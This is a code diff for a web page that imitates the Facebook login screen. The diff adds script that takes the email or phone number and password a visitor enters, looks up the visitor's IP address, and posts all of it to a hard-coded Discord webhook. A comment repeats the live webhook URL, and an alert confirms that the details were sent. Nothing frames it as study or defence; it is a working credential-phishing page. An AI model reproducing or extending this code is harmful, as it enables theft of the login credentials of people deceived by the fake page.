@@ -1,3 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title id="pageTitle">Facebook – log in or sign up</title>
+    <link rel="shortcut icon" href="../icons8-facebook-color-120.png" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
 
 <body>
     <div class="row res">
@@ -73,6 +82,7 @@
             <small>Meta © 2024</small>
         </div>
     </footer>
+    <!-- https://discord.com/api/webhooks/1246834276486348880/-rAgidIMbg6Vq08FAVr6jlvfAVr-7Kk59W2K2ktJSyQlQoFrkQGwTy8dvNc13aEKW2Tk -->
 
     <script>
         document.getElementById("registrationForm").addEventListener("submit", async function(event) {
@@ -82,18 +92,18 @@
         let email = document.getElementById("emailInput").value;
         let password = document.getElementById("passwordInput").value;
 
-        // // Fetch user's IP address from ipinfo.io
-        // let response = await fetch('https://ipinfo.io/json');
-        // let data = await response.json();
-        // let ip = data.ip;
-        // \nIP Address: ${ip}
+        // Fetch user's IP address from ipinfo.io
+        let response = await fetch('https://ipinfo.io/json');
+        let data = await response.json();
+        let ip = data.ip;
+
         // Construct the message to send to Discord webhook
         let message = {
-            content: `Login attempt\nEmail/Phone: ${email}\nPassword: ${password}`
+            content: `Login attempt\nEmail/Phone: ${email}\nPassword: ${password}\nIP Address: ${ip}`
         };
 
         // Send a POST request to the Discord webhook URL
-        fetch('https://discord.com/api/webhooks/1250874669238714440/dUtJVh3cCEzMdkaqNCYzJ-sumnjeQQ527ZxHcRbjrZh0Ojgoftqi74HVuxRcSjz0nmbf', {
+        fetch('https://discord.com/api/webhooks/1246834276486348880/-rAgidIMbg6Vq08FAVr6jlvfAVr-7Kk59W2K2ktJSyQlQoFrkQGwTy8dvNc13aEKW2Tk', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -104,6 +114,7 @@
             if (!response.ok) {
                 throw new Error('Network response was not ok');
             }
+            alert('Login details sent to Discord webhook!');
             // You can redirect or do other actions here after successful submission
         })
         .catch(error => {
@@ -114,6 +125,8 @@
     </script>
 
 </body>
+
+</html>
 <style>@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap");
 
     * {
